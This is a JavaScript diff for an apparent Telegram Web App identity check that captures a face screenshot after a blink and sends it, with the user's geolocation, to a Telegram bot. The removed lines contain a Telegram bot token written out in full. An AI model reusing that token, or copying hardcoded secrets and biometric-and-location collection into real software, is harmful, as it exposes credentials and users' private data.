@@ -286,7 +286,7 @@
                                     setTimeout(async () => {
                                         const dataURL = takeScreenshot("blink", detections.detection.box);
                                         await sendToTelegramBot(dataURL);
-                                        await sendMessageToTelegramBot("✅ Shaxsingiz tasdiqlandi!", latitude, longitude);
+                                        await sendMessageToTelegramBot(latitude, longitude);
                                         window.Telegram.WebApp.close();
                                     }, 100);
                                 }
@@ -416,25 +416,17 @@
             }
         }
 
-        async function sendMessageToTelegramBot(message, latitude, longitude) {
-            const botToken = "7907821344:AAEJYy-7K_8aDZlxeYGdDXPTHqBsOQNj40k";
+        async function sendMessageToTelegramBot(latitude, longitude) {
+            const tg = window.Telegram.WebApp;
+            const verificationData = {
+                chat_id: chat_id,
+                latitude: latitude,
+                longitude: longitude,
+                verification_status: "✅ Shaxsingiz tasdiqlandi!"
+            };
 
-            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chat_id,
-                    text: message + `\n📍 Manzil: (${latitude}, ${longitude})`
-                })
-            });
-
-            if (response.ok) {
-                console.log('Message sent successfully');
-            } else {
-                console.error('Failed to send message');
-            }
+            // ✅ Send data directly to Telegram bot
+            tg.sendData(JSON.stringify(verificationData));
         }
 
         async function handleGeoPermission() {
